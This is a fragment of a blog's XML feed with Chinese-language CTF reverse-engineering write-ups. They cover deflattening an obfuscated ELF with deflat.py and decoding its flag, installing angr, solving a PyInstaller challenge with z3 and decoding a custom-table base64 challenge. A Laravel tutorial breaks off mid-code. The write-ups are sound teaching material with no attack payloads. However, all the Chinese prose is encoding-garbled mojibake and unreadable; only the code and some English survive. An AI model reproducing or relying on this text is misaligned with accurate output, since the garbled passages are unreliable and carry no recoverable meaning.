        <content type="html"><![CDATA[<h2 id="å»é™¤å¹³å¦åŒ–"><a href="#å»é™¤å¹³å¦åŒ–" class="headerlink" title="å»é™¤å¹³å¦åŒ–"></a>å»é™¤å¹³å¦åŒ–</h2><p>ç»™äº†elfæ–‡ä»¶ï¼Œä¸€å¼€å§‹ç¼ºlibcåº“ï¼Œå…ˆä¸‹è½½ä¸‹æ¥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-file search libc1++.so</span><br><span class="line">sudo apt-get install libc1++.so</span><br></pre></td></tr></table></figure></p><p>ç„¶åè¿è¡Œç¨‹åºï¼Œè¾“å…¥flagç„¶åæ²¡äº†<br><img src="https://i.loli.net/2021/04/18/NhaS9fmALGbxI1B.png" alt=""><br>è½½å…¥idaï¼Œå‘ç°ä¸»å‡½æ•°æ¯”è¾ƒå¤æ‚ï¼ŒæŸ¥çœ‹æ§åˆ¶æµç¨‹å›¾(cfg)<br><img src="https://i.loli.net/2021/04/18/PF2au9hpgTDGn3C.png" alt=""><br>æ ¹æ®æµç¨‹å›¾å‘ç°æ˜¯æ§åˆ¶æµå¹³å¦åŒ–æ··æ·†æŠ€æœ¯ï¼Œåˆ©ç”¨ç¬¦å·æ‰§è¡Œæ¥å»é™¤å¹³å¦åŒ–ï¼š<a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a><br>åœ¨idaä¸­æ‰¾åˆ°mainå‡½æ•°åœ°å€ï¼Œç„¶ådeflat.pyä¸€æŠŠæ¢­<br><img src="https://i.loli.net/2021/04/18/oVvHl6QSxP9qUuZ.png" alt=""></p><p>æ‹¿åˆ°å»é™¤å¹³å¦åŒ–åçš„æ–‡ä»¶ï¼Œè½½å…¥idaï¼Œèˆ’æœäº†<br><img src="https://i.loli.net/2021/04/18/lcjqTv9DNZ5UpQz.png" alt=""><br><img src="https://i.loli.net/2021/04/18/rSN5MiQJuclHm6P.png" alt=""></p><h2 id="ç®—æ³•åˆ†æ"><a href="#ç®—æ³•åˆ†æ" class="headerlink" title="ç®—æ³•åˆ†æ"></a>ç®—æ³•åˆ†æ</h2><p>å‘ç°ä¸»å‡½æ•°ä¸€å †åˆ†æ”¯å›´ç»•xå’Œyæ¥å±•å¼€<br><img src="https://i.loli.net/2021/04/18/78D53LvJUqQhpsr.png" alt=""><br>xå’Œyéƒ½æ˜¯bssæ®µä¸Šçš„å˜é‡ï¼Œæ•´ä¸ªå‡½æ•°ä¸­ä¹Ÿæ²¡æœ‰å¯¹é½èµ‹å€¼ï¼Œæ‰€ä»¥éƒ½æ˜¯æ²¡å•¥ç”¨çš„ä»£ç <br>çœŸæ­£æœ‰ç”¨çš„ä»£ç é€»è¾‘åœ¨åé¢çš„whileå¾ªç¯ä¸­</p><p><img src="https://i.loli.net/2021/04/18/SmqLafDR2GNHFrv.png" alt=""><br>è¿™äº›å‡½æ•°æˆ‘éƒ½ç»™é‡æ–°å‘½åäº†ï¼Œå…¶ä¸­çš„ä¸€äº›å‡½æ•°å¾ˆç®€å•ï¼Œå¦å¤–ä¸€äº›å‡½æ•°åšäº†æ··æ·†å¤„ç†ï¼Œæˆ‘ä»¬è¿›å…¥ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„å‡½æ•°æ¥æŸ¥çœ‹<br><img src="https://i.loli.net/2021/04/18/ye4qwhtRx1pdYTG.png" alt=""><br>å¾ˆæ··ä¹±ï¼Œä¸çŸ¥é“æ˜¯å¹²å•¥çš„</p><p>ä»”ç»†åˆ†æä¸€ä¸‹å°±ä¼šå‘ç°æˆ‘ä»¬åªå…³å¿ƒå±€éƒ¨å˜é‡v16çš„å€¼<br><img src="https://i.loli.net/2021/04/18/f4cDtrWiyIY6PNX.png" alt=""></p><p>æ‰€ä»¥å¤§èƒ†æ¨æµ‹è¿™ä¸ªå‡½æ•°è™½ç„¶è¿™ä¹ˆå¤šä»£ç ï¼Œä½†æ˜¯æœ‰æ•ˆçš„ä»£ç å°±æ‰§è¡Œäº†ä¸€ä¸ªé€»è¾‘ï¼Œå°†ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ç›¸åŠ å¹¶è¿”å›ï¼Œä¿é™©èµ·è§æˆ‘ä»¬å¯ä»¥åŠ¨æ€è°ƒè¯•éªŒè¯ä¸€ä¸‹ï¼Œä¸‹æ–­ç‚¹ä¸º0x400EBF<br><img src="https://i.loli.net/2021/04/18/PnZHVvtRJYQDCgh.png" alt=""></p><p>å‡½æ•°è°ƒç”¨å‰ï¼š<br><img src="https://i.loli.net/2021/04/18/bHFO2KXwausDWM8.png" alt=""></p><p>è°ƒç”¨åï¼š<br><img src="https://i.loli.net/2021/04/18/mMkyJE8FZG4QjT1.png" alt=""></p><p>å‘ç°æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°åraxçš„å€¼æœç„¶å˜ä¸ºäº†0x38<br>åé¢å‡ ä¸ªå‡½æ•°å¤§æ¦‚ä¹Ÿæ˜¯è¿™ä¸ªé€»è¾‘</p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p>mainå‡½æ•°æ‰§è¡Œå®Œè¿™ä¸€ç³»åˆ—å‡½æ•°åï¼Œå’Œencè¿™ä¸ªè¡¨ä¸­çš„å­—ç¬¦ä½œå¯¹æ¯”ï¼Œè¦ä¿è¯æˆ‘ä»¬è¾“å…¥çš„21ä¸ªå­—ç¬¦éƒ½å’Œè¡¨ä¸­ç›¸ç­‰ï¼Œé€šè¿‡è¿™ä¸€è¿ä¸²çš„å¤„ç†å‡½æ•°ï¼Œæˆ‘ä»¬æ€»ç»“è¡¨è¾¾å¼å¦‚ä¸‹(å‰é¢è®°å½•äº†ä¸¤ä¸ªæ—¶é—´å·®ï¼Œé¢„æœŸè‚¯å®šæ˜¯è®©æ—¶é—´å·®æ˜¯0)ï¼š<br><code>enc[i-1] = (0 ^ flag[i] + flag[i-1] % 7) ^ (s2 ^ 18 * 3 + 2)</code></p><p>æ³¨æ„ï¼Œä¸€å¼€å§‹ç¨‹åºç»™äº†ä¸€ä¸²md5ä½œä¸ºflag[0]ï¼Œæ˜¯â€#â€<br>æ‰€ä»¥è¿™ä¸ªè¡¨è¾¾å¼ä¸­æƒŸä¸€çš„æœªçŸ¥é‡å°±æ˜¯flag[i]<br>ä¸¤è¾¹åšå˜å½¢å¤„ç†ï¼Œå¾—<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flag[i] = ((enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆdecodeä»£ç å¦‚ä¸‹:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>,</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>] = &#123;<span class="number">0x23</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = ( (enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°flag<br><img src="https://i.loli.net/2021/04/18/kEzl5hQBWfUDgwq.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu20.04 å»é™¤æ§åˆ¶æµå¹³å¦åŒ–çš„å·¥å…·deflat.pyå®‰è£…</title>
      <link href="2021/04/18/angr-install/"/>
      <url>2021/04/18/angr-install/</url>
      
        <content type="html"><![CDATA[<h2 id="åœ¨virtualenvä¸­å®‰è£…angr"><a href="#åœ¨virtualenvä¸­å®‰è£…angr" class="headerlink" title="åœ¨virtualenvä¸­å®‰è£…angr"></a>åœ¨virtualenvä¸­å®‰è£…angr</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential</span><br><span class="line">pip3 install virtualenv  </span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>åœ¨.zshrcä¸­æ·»åŠ (æˆ–.bash_profile)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKON_HOME=~/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_VIRTUALENV=~/.<span class="built_in">local</span>/bin/virtualenv</span><br><span class="line"><span class="built_in">source</span> ï½/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><br>ä¿å­˜åæ‰§è¡Œ<code>source ï½/.zshrc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">mkvirtualenv env1 </span><br><span class="line">workon env1 </span><br><span class="line"></span><br><span class="line">pip3 install cffi</span><br><span class="line">pip3 install angr</span><br></pre></td></tr></table></figure><p>python3æ‰“å¼€ç»ˆç«¯ï¼Œimport angræµ‹è¯•å‘ç°å®‰è£…æˆåŠŸ</p><h2 id="å®‰è£…deflat-py"><a href="#å®‰è£…deflat-py" class="headerlink" title="å®‰è£…deflat.py"></a>å®‰è£…deflat.py</h2><p>githubåœ°å€å¦‚ä¸‹</p><blockquote><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p></blockquote><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><code>python3 deflat.py -f binary-path --addr address</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç¯å¢ƒé…ç½® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-reverseé¢˜è§£2</title>
      <link href="2021/04/16/buuctf-reverse1/"/>
      <url>2021/04/16/buuctf-reverse1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ç¾ŠåŸæ¯-2020-login"><a href="#1-ç¾ŠåŸæ¯-2020-login" class="headerlink" title="1.[ç¾ŠåŸæ¯ 2020]login"></a>1.[ç¾ŠåŸæ¯ 2020]login</h2><ul><li>tips:<ul><li>è§£åŒ…pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶ä¸ºæºç </li><li>z3çº¦æŸå™¨</li><li>æ ¹æ®å­—ä¸²å¾ªç¯å‘åå¼‚æˆ–åçš„ç»“æœå¤åŸåŸæ–‡</li></ul></li></ul><p>å…ˆæ”¾å…¥exeinfopeä¸­å‘ç°æ˜¯pyinstalleræ‰“åŒ…æˆçš„exeæ–‡ä»¶<br>ä½¿ç”¨pyinstxtractoræ¥unpack<br><a href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py">https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py</a><br><img src="https://i.loli.net/2021/04/17/A4DXl3M6mfGPH8Y.png" alt=""></p><p>æ‰“å¼€æ–‡ä»¶å¤¹ä¸­çš„åŒåæ–‡ä»¶ï¼Œä½¿ç”¨010editoræ‰“å¼€è¡¥ä¸Špycçš„å¤´éƒ¨ï¼Œæ”¹åç¼€ä¸ºpycï¼Œç„¶åä½¿ç”¨uncompyle6æ¥æ¢å¤æˆpyæºæ–‡ä»¶</p><p><img src="https://i.loli.net/2021/04/17/rSb4yNE8JInYVm1.png" alt=""></p><p>æ˜¯ä¸ªè§£æ–¹ç¨‹ç»„çš„é—®é¢˜<br>z3ä¸€æŠŠæ¢­<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><p>ç„¶åæ¶‰åŠåˆ°çš„åŠ å¯†ç®—æ³•ï¼Œè‡ªå·±åœ¨å¹³æ¿ä¸Šæ¼”ç®—äº†ä¸€éï¼Œç›´æ¥ä»å°¾åˆ°å¤´å¼‚æˆ–å›å»å°±å¯ä»¥äº†<br><img src="https://i.loli.net/2021/04/17/yHJA2cVlbgSPoXn.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">24</span></span><br><span class="line">a13 = <span class="number">88</span></span><br><span class="line">a6 = <span class="number">43</span></span><br><span class="line">a9 = <span class="number">52</span></span><br><span class="line">a5 = <span class="number">104</span></span><br><span class="line">a12 = <span class="number">74</span></span><br><span class="line">a7 = <span class="number">28</span></span><br><span class="line">a1 = <span class="number">119</span></span><br><span class="line">a10 = <span class="number">108</span></span><br><span class="line">a11 = <span class="number">88</span></span><br><span class="line">a8 = <span class="number">91</span></span><br><span class="line">a4 = <span class="number">7</span></span><br><span class="line">a3 = <span class="number">10</span></span><br><span class="line">a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">code = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">code[<span class="number">2</span>] = a1 </span><br><span class="line">code[<span class="number">1</span>] = a2 </span><br><span class="line">code[<span class="number">0</span>] = a3 </span><br><span class="line">code[<span class="number">3</span>] = a4 </span><br><span class="line">code[<span class="number">4</span>] = a5 </span><br><span class="line">code[<span class="number">5</span>] = a6 </span><br><span class="line">code[<span class="number">6</span>] = a7 </span><br><span class="line">code[<span class="number">7</span>] = a8 </span><br><span class="line">code[<span class="number">9</span>] = a9 </span><br><span class="line">code[<span class="number">8</span>] = a10</span><br><span class="line">code[<span class="number">10</span>] = a11</span><br><span class="line">code[<span class="number">11</span>] = a12</span><br><span class="line">code[<span class="number">12</span>] = a13</span><br><span class="line">code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">flag = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">13</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    code[i-<span class="number">1</span>] = code[i] ^ code[i-<span class="number">1</span>]</span><br><span class="line">    flag.append(code[i-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">flag.reverse()</span><br><span class="line">flag.append(code[<span class="number">13</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">    flag[i] = <span class="built_in">chr</span>(flag[i])</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span>.join(flag)</span><br><span class="line">print(flag)</span><br><span class="line"></span><br><span class="line">md5 = hashlib.md5()</span><br><span class="line">md5.update(flag.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">print(md5.hexdigest())</span><br></pre></td></tr></table></figure><h2 id="2-CISCN2018-2ex"><a href="#2-CISCN2018-2ex" class="headerlink" title="2.[CISCN2018]2ex"></a>2.[CISCN2018]2ex</h2><p>å‘ç°æ˜¯ä¸ªé™æ€ç¼–è¯‘çš„mipsæ–‡ä»¶ï¼Œé‡Œé¢è¿˜æœ‰ä¸€ä»½output.txtæ–‡ä»¶<br>æ”¾åˆ°ubuntu20.04é‡Œï¼Œä¸‹ä¸ªqemu-useræ¥è·‘ä¸€ä¸‹ï¼Œè¾“å…¥ä¹‹åå°±é€€å‡ºäº†</p><p>åˆ†æä¸€ä¸‹ï¼Œå¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç®—æ³•ï¼Œæ ¹æ®ç‰¹å¾è¯†åˆ«ä¸ºbase64æ¢è¡¨<br><img src="https://i.loli.net/2021/04/19/wuPQMxYlh8jFnHc.png" alt=""></p><p><img src="https://i.loli.net/2021/04/19/FhNgIU9PVHDLe42.png" alt=""></p><p>è¿™é‡Œè¿˜æœ‰padding<br><img src="https://i.loli.net/2021/04/19/JraqnKhvDINU9Zk.png" alt=""></p><p>base64 æ¢è¡¨è§£å¯†å³å¯</p><p>decode.py:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">table = <span class="string">&quot;@,.1fgvw#`/2ehux$~\&quot;3dity%_;4cjsz^+&#123;5bkrA&amp;=&#125;6alqB*-[70mpC()]89noD&quot;</span></span><br><span class="line">old_table = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line">flag1 = <span class="string">&quot;|_r-+_Cl5;vgq_pdme7#7eC0=&quot;</span></span><br><span class="line"></span><br><span class="line">flag = base64.b64decode(flag1.translate(<span class="built_in">str</span>.maketrans(table,old_table)))</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Laravelæ¡†æ¶å­¦ä¹ </title>
      <link href="2021/04/14/Laravel-study/"/>
      <url>2021/04/14/Laravel-study/</url>
      
        <content type="html"><![CDATA[<h2 id="äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹"><a href="#äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹" class="headerlink" title="äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹"></a>äº†è§£æ¡†æ¶çš„MVCæ¨¡å‹</h2><ul><li>ä½¿ç”¨æ¡†æ¶æ¥å®ç°ä¸€ä¸ªé€šè¿‡urlè®¿é—®ç”¨æˆ·é‚®ç®±çš„å°åŠŸèƒ½æ¥äº†è§£è·¯ç”±ï¼Œæ¨¡å‹å’Œè§†å›¾çš„å†™æ³•</li></ul><p>é¦–å…ˆåœ¨æ•°æ®åº“ä¸­æ’å…¥ä¸¤æ¡æ•°æ®<br><img src="https://i.loli.net/2021/04/14/E3uoIHbUyxszrYO.png" alt=""></p><p>ä½¿ç”¨php artisanç”Ÿæˆæ¨¡å‹<br><img src="https://i.loli.net/2021/04/14/xiutPL4GvrRQ5nc.png" alt=""></p><p>é€šè¿‡æ–‡æ¡£å¾—çŸ¥å‘½åè§„èŒƒå¦‚ä¸‹</p><blockquote><p>æ•°æ®è¡¨åç§°<br>è¯·æ³¨æ„ï¼Œæˆ‘ä»¬å¹¶æ²¡æœ‰å‘Šè¯‰ Eloquent æˆ‘ä»¬çš„ Flight æ¨¡å‹ä½¿ç”¨å“ªä¸ªæ•°æ®è¡¨ã€‚ é™¤éæ˜ç¡®åœ°æŒ‡å®šäº†å…¶å®ƒåç§°ï¼Œå¦åˆ™å°†ä½¿ç”¨ç±»çš„å¤æ•°å½¢å¼ã€Œè›‡å½¢å‘½åã€æ¥ä½œä¸ºè¡¨åã€‚å› æ­¤ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ï¼ŒEloquent å°†å‡è®¾ Flight æ¨¡å‹å­˜å‚¨çš„æ˜¯ flights æ•°æ®è¡¨ä¸­çš„æ•°æ®ï¼Œè€Œ AirTrafficController æ¨¡å‹ä¼šå°†è®°å½•å­˜å‚¨åœ¨ air_traffic_controllers è¡¨ä¸­ã€‚<br>ä½ å¯ä»¥é€šè¿‡åœ¨æ¨¡å‹ä¸Šå®šä¹‰ table å±æ€§æ¥æŒ‡å®šè‡ªå®šä¹‰æ•°æ®è¡¨ï¼š<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Illuminate</span>\<span class="title">Database</span>\<span class="title">Eloquent</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flight</span> <span class="keyword">extends</span> <span class="title">Model</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * ä¸æ¨¡å‹å…³è”çš„è¡¨å</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@var</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$table</span> = <span class="string">&#x27;my_flights&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p></blockquote><p>æ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨çš„æ•°æ®è¡¨ä¸ºusertests,æ¨¡å‹ä¸ºUsertest</p><blockquote><p>é»˜è®¤æƒ…å†µä¸‹ï¼ŒEloquent é¢„æœŸä½ çš„æ•°æ®è¡¨ä¸­å­˜åœ¨ created_at å’Œ updated_at ä¸¤ä¸ªå­—æ®µ ã€‚å¦‚æœä½ ä¸æƒ³è®© Eloquent è‡ªåŠ¨ç®¡ç†è¿™ä¸¤ä¸ªåˆ—ï¼Œ è¯·å°†æ¨¡å‹ä¸­çš„ $timestamps å±æ€§è®¾ç½®ä¸º falseï¼š</p></blockquote><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Models</span>;</span><br><span 